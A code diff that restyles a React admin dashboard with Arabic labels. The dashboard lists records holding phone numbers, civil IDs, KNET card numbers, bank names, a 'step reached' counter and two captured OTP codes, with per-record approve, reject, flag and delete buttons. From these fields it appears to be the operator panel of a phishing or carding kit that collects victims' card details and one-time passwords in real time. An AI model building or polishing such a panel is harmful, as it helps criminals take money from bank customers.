@@ -114,35 +114,32 @@ function FlagColorSelector({ id, currentColor, onChange }) {
 
 function StatusBadge({ status }) {
   const map = {
-    approved: { text: "موافق", color: "from-green-500 to-green-600", Icon: CheckCircle },
-    rejected: { text: "مرفوض", color: "from-red-500 to-red-600", Icon: XCircle },
-    pending: { text: "معلق", color: "from-yellow-500 to-yellow-600", Icon: Clock },
+    approved: { text: "موافق", bg: "bg-emerald-500/15 text-emerald-300 border-emerald-500/25", dot: "bg-emerald-400" },
+    rejected: { text: "مرفوض", bg: "bg-red-500/15 text-red-300 border-red-500/25", dot: "bg-red-400" },
+    pending:  { text: "معلق",  bg: "bg-amber-500/15 text-amber-300 border-amber-500/25",  dot: "bg-amber-400" },
   };
-  const { text, color, Icon } = map[status] || map.pending;
+  const { text, bg, dot } = map[status] || map.pending;
   return (
-    <Badge className={`bg-gradient-to-r ${color} text-white flex items-center gap-1 shadow-sm`}>
-      <Icon className="h-3 w-3" />{text}
-    </Badge>
+    <span className={`inline-flex items-center gap-1.5 text-xs font-semibold px-2.5 py-1 rounded-lg border ${bg}`}>
+      <span className={`w-1.5 h-1.5 rounded-full ${dot}`} />
+      {text}
+    </span>
   );
 }
 
 function InfoBadge({ active, onClick, icon: Icon, text, inactiveText, colorClass }) {
+  if (!active) return (
+    <span className="inline-flex items-center gap-1.5 text-xs px-3 py-1.5 rounded-lg bg-slate-800/50 text-slate-600 border border-white/5">
+      <Icon className="h-3.5 w-3.5" />{inactiveText}
+    </span>
+  );
   return (
-    <TooltipProvider>
-      <Tooltip>
-        <TooltipTrigger asChild>
-          <Badge
-            variant={active ? "default" : "secondary"}
-            className={`cursor-pointer transition-all hover:scale-105 text-base px-4 py-1.5 ${active ? `bg-gradient-to-r ${colorClass} text-white shadow-md border-0` : "opacity-60"}`}
-            onClick={active ? onClick : undefined}
-          >
-            <Icon className="h-4 w-4 ml-1" />
-            {active ? text : inactiveText}
-          </Badge>
-        </TooltipTrigger>
-        <TooltipContent><p>{active ? "انقر للعرض" : "لا توجد بيانات"}</p></TooltipContent>
-      </Tooltip>
-    </TooltipProvider>
+    <button
+      onClick={onClick}
+      className={`inline-flex items-center gap-1.5 text-sm font-semibold px-4 py-1.5 rounded-xl bg-gradient-to-r ${colorClass} text-white shadow-lg hover:opacity-90 hover:shadow-xl transition-all duration-150 border-0 cursor-pointer`}
+    >
+      <Icon className="h-4 w-4" />{text}
+    </button>
   );
 }
 
@@ -610,72 +607,71 @@ export default function Dashboard() {
                     {paginated.map((r, index) => {
                       const statusLabel = r.network === "approved" ? "approved" : r.network === "rejected" ? "rejected" : "pending";
                       return (
-                        <tr key={r.id} className="border-b border-white/5 hover:bg-white/[0.03] transition-colors duration-150">
-                          <td className="px-6 py-4">
-                            <div className="flex flex-col gap-1.5">
-                              <span className="font-mono text-white text-sm">{r.phone_number || "—"}</span>
-                              <div className="flex flex-wrap gap-1.5">
-                                <InfoBadge
-                                  active={r.phone_number || r.id_number || r.civil_id}
-                                  onClick={() => openDialog(r, "personal")}
-                                  icon={User}
-                                  text="معلومات"
-                                  inactiveText="لا يوجد"
-                                  colorClass="from-blue-500 to-blue-500"
-                                />
-                                <InfoBadge
-                                  active={r.card_number}
-                                  onClick={() => openDialog(r, "card")}
-                                  icon={CreditCard}
-                                  text="KNET"
-                                  inactiveText="لا يوجد"
-                                  colorClass="from-green-500 to-green-500"
-                                />
-                              </div>
-                            </div>
-                          </td>
-                          <td className="px-6 py-4">
-                            {r.amount ? <Badge variant="outline" className="font-mono text-emerald-400 border-emerald-500/30">{r.amount}</Badge> : <span className="text-slate-500">—</span>}
-                          </td>
-                          <td className="px-6 py-4">
-                            {r.bank && BANK_NAMES[r.bank] ? (
-                              <span className="text-sm text-slate-300">{r.bank}</span>
-                            ) : (
-                              <span className="text-slate-500">—</span>
-                            )}
-                          </td>
-                          <td className="px-6 py-4"><StatusBadge status={statusLabel} /></td>
-                          <td className="px-6 py-4 text-center">
-                            {r.step_reached != null ? <Badge variant="outline" className="bg-slate-800/50 text-slate-300 border-slate-700">خطوة {r.step_reached}</Badge> : <span className="text-slate-500">—</span>}
-                          </td>
-                          <td className="px-6 py-4">
-                            <div className="flex flex-col gap-1">
-                              {r.otp1 ? <span className="font-mono text-xs text-amber-400 bg-amber-500/10 border border-amber-500/30 rounded px-2 py-0.5">OTP1: {r.otp1}</span> : null}
-                              {r.otp2 ? <span className="font-mono text-xs text-cyan-400 bg-cyan-500/10 border border-cyan-500/30 rounded px-2 py-0.5">OTP2: {r.otp2}</span> : null}
-                              {!r.otp1 && !r.otp2 && <span className="text-slate-500">—</span>}
-                            </div>
-                          </td>
-                          <td className="px-6 py-4">
-                            <div className="flex items-center gap-2 text-sm text-slate-400">
-                              <Clock className="h-4 w-4 flex-shrink-0 text-slate-500" />
-                              <span className="whitespace-nowrap">{r.created_date ? formatDistanceToNow(new Date(r.created_date), { addSuffix: true, locale: ar }) : "—"}</span>
-                            </div>
-                          </td>
-                          <td className="px-6 py-4">
-                            <div className="flex items-center gap-1 flex-wrap">
-                              <Button variant="outline" size="sm" onClick={() => handleApproval("approved", r.id)} disabled={statusLabel === "approved"} className="bg-green-500/20 text-green-400 border-green-500/30 hover:bg-green-500/30 text-xs h-7">
-                                <CheckCircle className="h-3 w-3 mr-1" />موافقة
-                              </Button>
-                              <Button variant="outline" size="sm" onClick={() => handleApproval("rejected", r.id)} disabled={statusLabel === "rejected"} className="bg-red-500/20 text-red-400 border-red-500/30 hover:bg-red-500/30 text-xs h-7">
-                                <XCircle className="h-3 w-3 mr-1" />رفض
-                              </Button>
-                              <FlagColorSelector id={r.id} currentColor={r.bank} onChange={handleFlagChange} />
-                              <Button variant="ghost" size="sm" onClick={() => handleDelete(r.id)} className="text-red-500 hover:text-red-400 hover:bg-red-950/30 h-7 w-7 p-0">
-                                <Trash2 className="h-3 w-3" />
-                              </Button>
-                            </div>
-                          </td>
-                        </tr>
+                        <tr key={r.id} className="border-b border-white/[0.04] hover:bg-white/[0.025] transition-colors duration-150 group">
+                           <td className="px-5 py-3.5">
+                             <div className="flex flex-col gap-2">
+                               <span className="font-mono text-white text-sm font-medium">{r.phone_number || r.civil_id || "—"}</span>
+                               <div className="flex flex-wrap gap-1.5">
+                                 <InfoBadge
+                                   active={r.phone_number || r.id_number || r.civil_id}
+                                   onClick={() => openDialog(r, "personal")}
+                                   icon={User}
+                                   text="معلومات"
+                                   inactiveText="لا بيانات"
+                                   colorClass="from-blue-500 to-indigo-600"
+                                 />
+                                 <InfoBadge
+                                   active={r.card_number}
+                                   onClick={() => openDialog(r, "card")}
+                                   icon={CreditCard}
+                                   text="KNET"
+                                   inactiveText="لا بطاقة"
+                                   colorClass="from-emerald-500 to-teal-600"
+                                 />
+                               </div>
+                             </div>
+                           </td>
+                           <td className="px-5 py-3.5">
+                             {r.amount
+                               ? <span className="inline-flex items-center font-mono text-sm font-bold text-emerald-400 bg-emerald-500/10 border border-emerald-500/20 rounded-lg px-3 py-1">{r.amount}</span>
+                               : <span className="text-slate-600">—</span>}
+                           </td>
+                           <td className="px-5 py-3.5">
+                             {r.bank
+                               ? <span className="text-sm font-semibold text-slate-200">{r.bank}</span>
+                               : <span className="text-slate-600">—</span>}
+                           </td>
+                           <td className="px-5 py-3.5"><StatusBadge status={statusLabel} /></td>
+                           <td className="px-5 py-3.5 text-center">
+                             {r.step_reached != null
+                               ? <span className="inline-flex items-center justify-center w-8 h-8 rounded-full bg-violet-500/15 border border-violet-500/25 text-violet-300 text-sm font-bold">{r.step_reached}</span>
+                               : <span className="text-slate-600">—</span>}
+                           </td>
+                           <td className="px-5 py-3.5">
+                             <div className="flex flex-col gap-1.5">
+                               {r.otp1 ? <span className="font-mono text-xs text-amber-300 bg-amber-500/10 border border-amber-500/20 rounded-lg px-2.5 py-1 whitespace-nowrap">① {r.otp1}</span> : null}
+                               {r.otp2 ? <span className="font-mono text-xs text-cyan-300 bg-cyan-500/10 border border-cyan-500/20 rounded-lg px-2.5 py-1 whitespace-nowrap">② {r.otp2}</span> : null}
+                               {!r.otp1 && !r.otp2 && <span className="text-slate-600">—</span>}
+                             </div>
+                           </td>
+                           <td className="px-5 py-3.5">
+                             <span className="text-xs text-slate-500 whitespace-nowrap">{r.created_date ? formatDistanceToNow(new Date(r.created_date), { addSuffix: true, locale: ar }) : "—"}</span>
+                           </td>
+                           <td className="px-5 py-3.5">
+                             <div className="flex items-center gap-1">
+                               <Button variant="ghost" size="sm" onClick={() => handleApproval("approved", r.id)} disabled={statusLabel === "approved"} className="h-8 w-8 p-0 rounded-lg bg-emerald-500/10 text-emerald-400 hover:bg-emerald-500/20 border border-emerald-500/20 disabled:opacity-30">
+                                 <CheckCircle className="h-4 w-4" />
+                               </Button>
+                               <Button variant="ghost" size="sm" onClick={() => handleApproval("rejected", r.id)} disabled={statusLabel === "rejected"} className="h-8 w-8 p-0 rounded-lg bg-red-500/10 text-red-400 hover:bg-red-500/20 border border-red-500/20 disabled:opacity-30">
+                                 <XCircle className="h-4 w-4" />
+                               </Button>
+                               <FlagColorSelector id={r.id} currentColor={r.bank} onChange={handleFlagChange} />
+                               <Button variant="ghost" size="sm" onClick={() => handleDelete(r.id)} className="h-8 w-8 p-0 rounded-lg text-slate-600 hover:text-red-400 hover:bg-red-500/10">
+                                 <Trash2 className="h-4 w-4" />
+                               </Button>
+                             </div>
+                           </td>
+                         </tr>
                       );
                     })}
                   </tbody>
